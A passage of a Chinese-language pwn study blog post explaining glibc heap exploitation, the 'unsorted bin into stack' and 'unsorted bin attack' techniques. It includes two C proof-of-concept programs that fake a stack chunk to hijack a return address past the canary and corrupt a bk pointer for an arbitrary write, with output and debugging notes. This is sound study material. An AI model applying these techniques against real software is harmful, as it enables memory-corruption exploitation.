bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
+
+<h3 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted bin into stack"></a>unsorted bin into stack</h3><p>回顾一下堆块分配的过程，当请求的大小在fastbins和small bins中无法得到满足时，就会进入一个for循环，按照先进先出的方式 遍历unsorted bin，此时如果请求是一个small chunk，且满足要 求，则直接返回；如果不是，则将chunk取出并整理回对应的bins 中，然后进行下一轮循环。</p>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>下面来看一个例子，该程序试图在栈上伪造一个fake chunk来达 到欺骗malloc的目的，如果利用成功，就会调用函数jackpot()，输 出字符串“Nice jump d00d”。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">	<span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);</span><br><span class="line">	<span class="keyword">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Create a fake chunk on the stack&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);</span><br><span class="line">	stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">	stack_buffer[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>)stack_buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);</span><br><span class="line">	victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">	victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line">	<span class="keyword">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">	<span class="built_in">memcpy</span>((p2+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">	assert((<span class="keyword">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="keyword">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">分配victim chunk</span><br><span class="line">分配另一个chunk防止与top chunk合并</span><br><span class="line">释放victim chunk:<span class="number">0x1ef8420</span>时，它将被插入unsorted bin中</span><br><span class="line">在栈上创建一个fake chunk用于下一次分配和指向任意可写地址的bk指针，模拟一个可以覆盖victim-&gt;size和victim-&gt;bk指针的漏洞</span><br><span class="line">Size应该与下一个返回fake_chunk的请求大小不同，需要通过检查 <span class="number">2</span>*SIZE_SZ (&gt; <span class="number">16</span> on x64) &amp;&amp; &lt; av-&gt;system_mem\n</span><br><span class="line">现在，下一个<span class="built_in">malloc</span>将返回我们的假块的区域:<span class="number">0x7ffd5a615840</span></span><br><span class="line"><span class="built_in">malloc</span> (<span class="number">0x100</span>): <span class="number">0x7ffd5a615840</span></span><br><span class="line">Nice jump d00d</span><br></pre></td></tr></table></figure>
+
+<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>首先分配两个堆块</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201152243129.png" alt="image-20220114173311530"></p>
+<p>然后free掉第一个chunk</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201152243130.png" alt="image-20220114173428881"></p>
+<p>然后修改掉它的 bk 指针指向在栈上伪造的 fake chunk，同时把这个chunk的 size 给改掉,让再次malloc到fake chunk。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201152243131.png" alt="image-20220114173739592"></p>
+<p>接下来再去 malloc 的时候就可以申请到在栈上伪造的那个 chunk 了</p>
+<blockquote>
+<p>同样地，可以修改保存在栈上的返回地址为shellcode地址，实 际利用中需要考虑stack canaries的问题。需要注意的是，fake chunk的fd指针在这个过程中被修改成了unsorted bin的地址，位于 main_arena，因此可以通过信息泄露得到libc的地址，</p>
+</blockquote>
+<h3 id="unsorted-bin-attack-2"><a href="#unsorted-bin-attack-2" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>如果我们只是想修改某块内存的值，而不是获得内存的控制权， 那么就可以使用unsorted bin attack。该技术并不要求在目标内存 伪造fake chunk，因此使用起来更加方便，通常是为进一步的攻击做 准备的，例如泄露libc地址，或者修改全局变量global_max_fast， 使更大的chunk被视为fastbin，从而做一些fastbin attack。</p>
+<p> 我们知道unsorted bin是一个双向链表，在分配时会通过特殊的 unlink操作从链表中移除chunk，所以如果能够控制chunk的bk指 针，就可以达到任意位置写入。</p>
+<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">		   <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">		   <span class="string">&quot;point to %p\n&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">	p[<span class="number">1</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span></span><br><span class="line">		   <span class="string">&quot;rewritten:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="keyword">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">这个程序演示了将一个大的无符号长值写入堆栈的unsorted bin攻击</span><br><span class="line">在实践中，unsorted bin攻击通常会为进一步的攻击做好准备，例如在libc中重写全局变量global_max_fast以应对进一步的fastbin攻击</span><br><span class="line">让我们先看看我们想要在堆栈上重写的目标:</span><br><span class="line"><span class="number">0x7fff6e841948</span>: <span class="number">0</span></span><br><span class="line">现在，我们在堆上分配第一个普通块:<span class="number">0x240c010</span></span><br><span class="line">并分配另一个普通块，以避免在<span class="built_in">free</span>()期间将和top chunk合并。</span><br><span class="line">我们现在释放第一个块，它将被插入到 unsorted bin中，其bk指针指向<span class="number">0x7f64787b9b78</span></span><br><span class="line">现在模拟一个可以覆盖victim-&gt;bk指针的漏洞</span><br><span class="line">我们用目标地址<span class="number">-16</span>(在<span class="number">32</span>位机器中，它应该是目标地址<span class="number">-8</span>)来写它:<span class="number">0x7fff6e841938</span></span><br><span class="line">让我们再次使用<span class="built_in">malloc</span>来获得刚刚释放的块。在此期间，目标应该已经被重写:</span><br><span class="line"><span class="number">0x7fff6e841948</span>: <span class="number">0x7f64787b9b78</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h4><p>首先我们分配两个块，第二个块是防止与top chunk合并</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201152243132.png" alt="image-20220114182748276"></p>
+<p>当 free之后，这个 chunk 的 fd、bk 都指向了 unsorted bin 的位置，因为 unsorted bin 是双向链表</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201152243133.png" alt="image-20220114182902686"></p>
+<p>修改bk指针</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201152243134.png" alt="image-20220114183028628"></p>
+<p>再次执行malloc(400),stack_var就被修改为了unsorted bin的地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201152243135.png" alt="image-20220114183322616"></p>
+
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2022/01/15/magicheap/" title="magicheap">
+                    <div class="nextTitle">magicheap</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2022/01/13/pwn200/" title="pwn200">
+                    <div class="prevTitle">pwn200</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:2811745785@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/wysyrg" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#unsorted-bin-attack"><span class="toc-number">1.</span> <span class="toc-text">unsorted bin attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">unsorted bin介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin%E6%BA%90%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text">unsorted bin源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack-1"><span class="toc-number">1.3.</span> <span class="toc-text">unsorted bin attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-into-stack"><span class="toc-number">1.4.</span> <span class="toc-text">unsorted bin into stack</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.4.1.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">1.4.2.</span> <span class="toc-text">调试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack-2"><span class="toc-number">1.5.</span> <span class="toc-text">unsorted bin attack</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">1.5.1.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95-1"><span class="toc-number">1.5.2.</span> <span class="toc-text">调试</span></a></li></ol></li></ol></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 21
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2022 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span>
+            <a class="archive-post-title" href="/2022/04/04/%E5%B3%BB%E6%9E%81pwn/">峻极pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/19</span>
+            <a class="archive-post-title" href="/2022/03/19/stack%20pivoting/">stack pivoting</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span>
+            <a class="archive-post-title" href="/2022/03/15/libc-2.26/">[Untitled Post]</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span>
+            <a class="archive-post-title" href="/2022/02/26/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/16</span>
+            <a class="archive-post-title" href="/2022/01/16/large%20bin%20attack/">large bin attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span>
+            <a class="archive-post-title" href="/2022/01/15/magicheap/">magicheap</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span>
+            <a class="archive-post-title" href="/2022/01/15/unsorted%20bin%20attack/">unsorted bin attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/13</span>
+            <a class="archive-post-title" href="/2022/01/13/pwn200/">pwn200</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/12</span>
+            <a class="archive-post-title" href="/2022/01/12/write%20some%20paper/">write some paper</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/09</span>
+            <a class="archive-post-title" href="/2022/01/09/fastbin_attack/">fastbin_attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/overlapping%20chunks/">overlapping chunks</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/gdb%E8%B0%83%E8%AF%95/">gdb的使用</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/csaw/">csaw部分题解</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/ciscn_2019/">ciscn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/secretHolder_hitcon_2016/">secretHolder_hitcon_2016</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/unsafe_unlink/">unsafe_unlink</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/kernel_pwn%E7%8E%AF%E5%A2%83/">kernel pwn环境搭建</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/off-by-one/">off-by-one</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/pwnable%E5%88%B7%E9%A2%98/">pwnable刷题</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/lab1%20%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab1实验报告</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/lab2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab2 实验报告</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="unsorted bin attack">
+                <span class="iconfont-archer">&#xe606;</span>
+                unsorted bin attack
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                pwn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="house of spirit">
+                <span class="iconfont-archer">&#xe606;</span>
+                house of spirit
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="fastbin doule free">
+                <span class="iconfont-archer">&#xe606;</span>
+                fastbin doule free
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="os">
+                <span class="iconfont-archer">&#xe606;</span>
+                os
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Diary">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Diary
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMeta = {
+        root: "/",
+        author: "John Doe"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20210823"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20210823"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20210823" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
